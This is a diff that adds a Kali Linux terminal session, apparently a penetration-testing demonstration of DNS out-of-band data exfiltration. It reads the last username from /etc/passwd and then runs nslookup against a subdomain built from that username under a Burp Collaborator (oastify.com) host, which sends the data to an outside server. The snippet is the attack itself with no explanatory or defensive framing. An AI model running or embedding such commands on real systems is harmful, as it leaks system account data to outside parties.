@@ -1,0 +1,7 @@
+┌──(kali㉿kali)-[~/Documents]
+└─$ cat /etc/passwd | tail -n1 | cut -d ":" -f 1
+
+Perla
+                                                                                                                                                      
+┌──(kali㉿kali)-[~/Documents]
+└─$ nslookup $(cat /etc/passwd | tail -n1 | cut -d ":" -f 1).kl9dtf96irwnwq4bljh5uvm0brhi5atz.oastify.com
